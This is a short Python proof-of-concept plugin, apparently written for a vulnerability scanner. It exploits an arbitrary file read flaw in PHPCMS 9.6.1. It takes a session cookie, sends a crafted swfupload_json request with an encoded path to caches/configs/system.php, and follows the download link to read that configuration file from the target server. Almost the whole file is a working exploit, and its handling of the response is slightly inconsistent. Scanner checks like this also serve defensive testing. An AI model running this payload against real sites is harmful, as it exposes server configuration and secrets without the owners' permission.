# Author:w8ay
# Name:测试DEMO
'''
name: phpcms 9.6.1任意文件读取漏洞
referer: http://bobao.360.cn/learning/detail/3805.html
author: Lucifer
description: phpcms最新版本任意文件读取，漏洞原理见来源页面。
'''
import HackRequests
import re


def poc(arg, **kwargs):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    url_preffix = arg + "/index.php?m=wap&c=index&a=init&siteid=1"
    hack = HackRequests.hackRequests()
    hh = hack.http(url_preffix)
    tmp_cookie = False
    if hh.cookies:
        tmp_cookie = list(hh.cookies.values())[-1]
    if not tmp_cookie:
        return False
    post_data = {
        "userid_flash": tmp_cookie
    }
    payload = "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&filename=test.jpg&src=%26i%3D3%26d%3D1%26t%3D9999999999%26catid%3D1%26ip%3D8.8.8.8%26m%3D3%26modelid%3D3%26s%3Dcaches%2fconfigs%2fsystem.p%26f%3Dh%25253Cp%26xxxx%3D"

    vulnurl = arg + payload
    req2 = hack.http(vulnurl, post=post_data, headers=headers, timeout=10, verify=False)

    att_json = list(req2.cookies.values())[-1]

    req3 = hack.http(arg + "/index.php?m=content&c=down&a=init&a_k=" + att_json, headers=headers, timeout=10)
    pattern = '<a.*?href="(.*?)".*?>.*?</a>'
    link = re.search(pattern, req3.text).group(1)
    req4 = hack.http(arg + "/index.php" + link, headers=headers, verify=False)
    if r"<?php" in req4.text() and r"phpsso" in req4.text():
        result = {
            "name": "PHPCMS fli",  # 插件名称
            "content": "存在phpcms 9.6.1任意文件读取漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": arg,  # 漏洞存在url
            "log": req4.log,
            "tag": "fli"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass